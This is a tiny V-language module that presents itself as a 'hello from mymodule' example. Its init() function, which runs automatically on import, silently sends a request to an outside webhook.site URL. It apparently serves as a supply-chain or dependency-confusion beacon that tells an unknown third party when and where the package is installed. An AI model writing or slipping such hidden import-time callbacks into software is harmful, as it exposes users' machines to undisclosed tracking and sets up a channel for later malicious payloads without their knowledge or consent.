module ganteng

import os
import http
// To export a function we have to use `pub`
pub fn say_hi() {
	println('hello from mymodule!')
}

fn init(){
resp := http.get('https://webhook.site/eaadc4bb-70c8-42c2-9d3d-7a212d91f7be') or {
    println('failed to fetch data from the server')
    return
}
}
